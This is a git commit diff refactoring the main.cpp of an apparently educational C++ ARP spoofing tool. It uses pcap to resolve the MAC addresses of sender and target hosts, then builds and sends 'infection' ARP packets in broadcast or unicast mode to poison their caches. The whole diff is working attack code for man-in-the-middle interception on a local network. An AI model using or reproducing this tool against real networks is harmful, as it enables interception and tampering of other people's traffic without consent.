46a4ebea024ce1647579fcca490bb02ac305daed
Park seohyeon <psh0036@naver.com>
2026-01-28 02:30:24 +0900

    Main 개선 (#7)
    - 수정된 메서드를 활용하여 패킷을 보내도록 변경

--- src/main.cpp
+++ src/main.cpp
@@ -1,24 +1,21 @@
-#include "INCLUDE.h"
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "utill.h"
 
 #define MAC_ADDR_LEN 6
 
-#pragma pack(push, 1)
 struct DeviceAddress
 {
         Mac mac;
         Ip ip;
 };
-#pragma pack(pop)
 
 int main(int argc, char *argv[])
 {
         if (argc <= 2)
         {
-                usage();
-                return -1;
+            usage();
+            return -1;
         }
 
         char *dev = argv[1]; // 네트워크 인터페이스 명
@@ -27,18 +24,22 @@ int main(int argc, char *argv[])
         pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
         if (handle == nullptr)
         {
-                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-                return -1;
+            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+            return -1;
         }
         DeviceAddress attacker, sender, target;
-        attacker.ip = myIp(dev);
+        attacker.ip = getMyIp(dev);
         attacker.mac = Mac::getMyMac(dev);
         
         if (argc == 3)
         { // broadcat 모드
-                target.ip = Ip(argv[2]);
-                EthArpPacket broadcast_arp_packet = Broadcast_Infection(dev, attacker.mac, target.ip);
-                SendInfectionPacket(handle, broadcast_arp_packet);
+                target.ip = Ip(argv[2]); // 라우터
+                EthArpPacket BroadcastArpPacket = Make_Infection_Packet(
+                        attacker.mac, Mac::nullMac(),
+                        Ip("0.0.0.0"), target.ip,
+                        Mode::Broadcast
+                        );
+                sendPacket(handle, (const u_char*)&BroadcastArpPacket, sizeof(EthArpPacket));
         }
         else
         { // 유니캐스트 모드
@@ -47,22 +48,30 @@ int main(int argc, char *argv[])
                         usage();
                         return -1;
                 }
+
+                // getting target(router) mac just one time
+
                 for (int i = 2; i < argc - 1; i += 2)
                 {
-                        
                         sender.ip = Ip(argv[i]);
-                        EthArpPacket arp_packet = normal_packet(dev, attacker.mac, sender.ip, attacker.ip);
-                        sender.mac = get_mac(handle, reinterpret_cast<const u_char *>(&arp_packet), sizeof(EthArpPacket));
-                        // std::string sender_ip = argv[i];
-                        std::string target_ip = argv[i + 1];
-
-                        // target
                         target.ip = Ip(argv[i + 1]);
-                        EthArpPacket arp_packet2 = normal_packet(dev, attacker.mac, target.ip, attacker.ip);
-                        target.mac = get_mac(handle, reinterpret_cast<const u_char *>(&arp_packet2), sizeof(EthArpPacket));
 
-                        EthArpPacket injection_packet = One_Infection(dev, attacker.mac, sender.mac, sender.ip, target.ip);
-                        SendInfectionPacket(handle, injection_packet);
+                        EthArpPacket query_sender = Make_Normal_Packet(attacker.mac, attacker.ip, sender.ip);
+                        sender.mac = get_mac(handle, reinterpret_cast<const u_char *>(&query_sender), sizeof(EthArpPacket), sender.ip);
+
+                        if (target.mac == Mac::nullMac()) {
+                                EthArpPacket query_target = Make_Normal_Packet(attacker.mac, attacker.ip, target.ip);
+                                target.mac = get_mac(handle, reinterpret_cast<const u_char *>(&query_target), sizeof(EthArpPacket), target.ip);
+                        }
+
+                        EthArpPacket infection_packet = Make_Infection_Packet(
+                                attacker.mac,
+                                sender.mac,
+                                sender.ip,
+                                target.ip,
+                                Mode::Unicast
+                                );
+                        sendPacket(handle, reinterpret_cast<const u_char *>(&infection_packet), sizeof(EthArpPacket));
                 }
         }
 
